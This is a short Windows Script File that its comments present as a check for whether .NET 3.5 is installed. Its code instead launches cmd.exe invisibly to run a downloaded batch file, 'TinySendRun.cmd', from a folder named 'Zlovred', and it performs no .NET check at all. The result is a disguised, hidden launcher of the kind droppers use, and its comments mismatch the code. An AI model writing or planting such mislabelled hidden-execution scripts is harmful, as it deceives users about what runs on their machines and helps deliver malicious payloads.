<?xml version="1.0" encoding="UTF-8"?>
<!-- ***************************** -->
<!-- File wsf -->
<!-- Test001.dotNet04.Err02.wsf -->
<!--
 * Test if dotNet 3.5 is Installed
 * (errorlevel 2 Text)
-->
<!-- ***************************** -->
<job id="ID1">
	<script language="JScript"></script>
	<script language="JScript">
	<![CDATA[
/******************************************************************************
'
' RunDownloadedCMD01( strPath, strCMD, intTimeOut )
' This Function Run Hidden a strCMD File with Normal Privileges
' with Command "cmd /c " & strPath & "\" & strCMD
'
' PARAMETERS:   strPath -- The Path to strCMD
'               strVBS -- a CMD File with instructions
'               (Windows Command Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedCMD01(strPath, strCMD) {
	var constRun_CMD, constOpt;
	// Define Windows Scripts Options
	constRun_CMD = "/c ";
	var strValue, shApp, fso, wsh, envProc, pathCMD;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	envProc = wsh.Environment("PROCESS");
	pathCMD = envProc("SystemRoot") + "\\System32";
	// Check Paths
	if(!fso.FileExists(pathCMD + "\\cmd.exe")) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strCMD)) {
		return 1
	};
	// Set Cscript Command Arguments
	strValue = constRun_CMD + "\"" + strPath + "\\" + strCMD + "\"";
	// Run cscript.exe without Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, strPath, "", 0);
	return 0;
}
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
	Dim strPath, strCMD, iRes
	strPath="C:\pub1\Distrib\Zlovred"
	strCmd="TinySendRun.cmd"
	iRes=RunDownloadedCMD01(strPath, strCMD)
	' WScript.Echo iRes
	]]>
	</script>
</job>
